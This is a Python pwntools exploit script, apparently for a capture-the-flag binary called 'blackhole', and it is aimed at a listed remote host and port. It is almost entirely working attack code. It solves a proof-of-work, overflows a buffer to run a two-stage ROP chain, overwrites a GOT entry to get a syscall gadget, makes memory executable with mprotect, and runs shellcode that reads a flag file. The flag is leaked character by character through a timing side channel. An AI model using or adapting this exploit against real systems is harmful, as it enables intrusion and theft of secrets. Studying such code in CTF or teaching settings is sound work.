#!/usr/bin/python
from pwn import *
import sys, itertools
from hashlib import sha256

LOCAL = True

HOST = "202.120.7.203"
PORT = 666

# pop rbx / rbp / r12 / r13 / r14 / r15
PGAD = 0x000000000400A4A

# mov rdx, r13 / mov rsi, r14 / mov edi, r15 / call r12 + rbx*8
CALL = 0x0000000000400A30
LEAVERET = 0x00000000004009a5

def call_func(funcptr, rdi, rsi, rdx, rbx_after=0, rbp_after=0, r12_after=0, r13_after=0, r14_after=0, r15_after=0):
    payload = ""
    payload += p64(PGAD)
    payload += p64(0x0)             # rbx
    payload += p64(0x1)             # rbp (1 to get more calls)
    payload += p64(funcptr)         # r12 (func to call)
    payload += p64(rdx)             # r13 => rdx
    payload += p64(rsi)             # r14 => rsi
    payload += p64(rdi)             # r15 => rdi
    payload += p64(CALL)
    payload += "A"*8
    payload += p64(rbx_after)
    payload += p64(rbp_after)
    payload += p64(r12_after)
    payload += p64(r13_after)
    payload += p64(r14_after)
    payload += p64(r15_after)

    return payload

charset = string.letters+string.digits

def calcpow(chal):
    for combo in itertools.combinations_with_replacement(string.letters+string.digits,4):
        sol = ''.join(combo)        
        if sha256(chal + sol).hexdigest().startswith("00000"):
            return sol

    return None

def get_connection():
    return remote("localhost", 6666) if LOCAL else remote(HOST, PORT)

def testchar(offset, compval):
    found_pow = False

    log.info("Solve pow")

    sol = None

    while sol == None:
        r = get_connection()
        
        sol = calcpow(r.recvline().strip())

        if sol == None:
            r.close()

    r.send(sol)
    
    log.info("Stage1: Prepare bigger ropchain (on bss)")
    
    payload = ""
    payload += "A"*32
    payload += p64(0x601150)

    context.arch = "amd64"
    
    # Read flag and compare char at offset with comp value
    # exit if condition false / loop if condition true    
    SC = """
        mov rax, 2
        mov rdi, 0x6012c0
        mov rsi, 0
        mov rdx, 0
        syscall

        xchg rax, rdi
        xor rax, rax
        mov rsi, 0x601600
        mov rdx, 60
        syscall

        mov rcx, 0x601600
        add rcx, %d
        mov al, byte ptr [rcx]
        cmp al, %d
        jge good

        bad:
        mov rax, 60
        syscall

        good:
        mov rax, 0
        mov rdi, 0
        mov rsi, 0x601500
        mov rdx, 0x100
        syscall
        jmp good
    """ % (offset, compval)

    SC = asm(SC)

    off = 656-256+len(SC)

    payload += call_func(e.got["read"], 0, 0x601150, off, 0x0, 0x601150 -8)
    payload += p64(LEAVERET)
    payload += "B"*(256-len(payload))
    
    log.info("Stage2: Send second ropchain (known address)")

    # overwrite LSB of alarm to get a syscall gadget
    payload += call_func(e.got["read"], 0, e.got["alarm"], 1)
    payload += call_func(e.got["read"], 0, 0x601500, 10)            # set rax to mprotect  
    payload += call_func(e.got["alarm"], 0x00601000, 0x1000, 0x7)   # syscall
    payload += p64(0x6012e0)
    payload += "flag\x00"
    
    payload = payload.ljust(656, "\x00")
    payload += SC

    # alarm => syscall gadget
    payload += p8(0x85)

    payload += "B"*(0x800-len(payload))

    r.sendline(payload)

    try:
        r.recv(1, timeout=1)
        r.close()
        return True
    except:
        r.close()
        return False


def brute_flag():
    result = ""

    # binary search => read flag
    while (True):
        range_low = 0
        range_high = 128

        for i in range(0, 8):
            testch = (range_high + range_low)/2

            print "Test: %s" % chr(testch)

            res = testchar(len(result), testch)

            if res:
                range_low = testch
            else:
                range_high = testch

        if testch == 0:
            break

        result += chr(testch)
        print "Found: %s" % result

    return result

def exploit(r):
    r.close()

    brute_flag()

    return

if __name__ == "__main__":
    e = ELF("./blackhole")

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
        exploit(r)
    else:
        LOCAL = True
        r = remote("localhost", 6666)
        print util.proc.pidof(r)
        pause()
        exploit(r)
